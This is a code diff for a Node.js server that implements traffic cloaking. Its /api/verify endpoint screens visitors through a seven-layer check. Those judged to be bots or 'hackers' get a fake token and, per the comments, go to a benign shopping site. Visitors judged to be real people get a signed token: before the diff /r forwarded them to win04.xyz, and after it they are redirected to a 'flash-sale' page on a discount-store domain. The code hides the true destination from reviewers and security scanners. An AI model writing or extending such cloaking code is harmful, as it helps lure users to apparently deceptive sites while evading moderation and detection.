@@ -9,8 +9,8 @@ const PORT = process.env.PORT || 3001;
 // 环境变量（从 Zeabur 或 .env 注入）
 // ============================================
 const IPAPI_IS_KEY = process.env.IPAPI_IS_KEY || '';
-const HMAC_SECRET = process.env.HMAC_SECRET || 'change-me-in-production';
-const TURNSTILE_SECRET = process.env.TURNSTILE_SECRET || '';
+const HMAC_SECRET=process.env.HMAC_SECRET || 'change-me-in-production';
+const TURNSTILE_SECRET=process.env.TURNSTILE_SECRET || '';
 const REAL_REDIRECT = process.env.REAL_REDIRECT || 'https://www.win04.xyz/?type=0&cid=402&a=x';
 const FAKE_REDIRECT = process.env.FAKE_REDIRECT || 'https://www.ubuy.com.ph/';
 const FLASH_SALE_URL = process.env.FLASH_SALE_URL || 'https://mings.hugediscount.store/flash-sale';
@@ -154,21 +154,32 @@ async function runChecks(req) {
 
 // ============================================
 // POST /api/verify
-// 返回 JSON { token } — 前端只知道 /r?token=xxx，不知道真实 URL
-// token = HMAC token (真人) 或 fake_xxx (机器人)
+// - 静默验证（无 answer 字段）：7层全过 → 直接 302 到 /flash-sale?token=xxx
+// - 提交验证（有 answer 字段）：返回 JSON { token, pass }
 // ============================================
 app.post('/api/verify', async (req, res) => {
   const result = await runChecks(req);
+  const isSilent = (req.body.answer === undefined && req.body.correctAnswer === undefined);
 
   if (!result.pass) {
-    // 骇客/机器人 → fake token (/r 会重定向到 ubuy.com.ph)
-    console.log(`[verify] FAIL (${result.reason}) → fake token`);
-    return res.json({ token: result.token });
+    // 骇客/机器人 → 返回假token的 JSON
+    console.log(`[verify] FAIL (${result.reason}) → JSON with fake token`);
+    return res.json({ token: result.token, pass: false, reason: result.reason });
   }
 
-  // 真人 → HMAC token (/r 会验证并重定向到 win04.xyz)
-  console.log(`[verify] PASS → HMAC token`);
-  return res.json({ token: result.token });
+  // 7层全过
+  const clientIP = getClientIP(req);
+
+  // 静默验证且全过 → 直接 302 到 /flash-sale（浏览器 follow）
+  if (isSilent) {
+    const redirectUrl = `${FLASH_SALE_URL}?token=${encodeURIComponent(result.token)}`;
+    console.log(`[verify] SILENT PASS → 302 to ${redirectUrl}`);
+    return res.redirect(302, redirectUrl);
+  }
+
+  // 提交验证 → 返回 JSON { token }
+  console.log(`[verify] SUBMIT PASS → JSON with token`);
+  return res.json({ token: result.token, pass: true, reason: 'verified' });
 });
 
 // ============================================
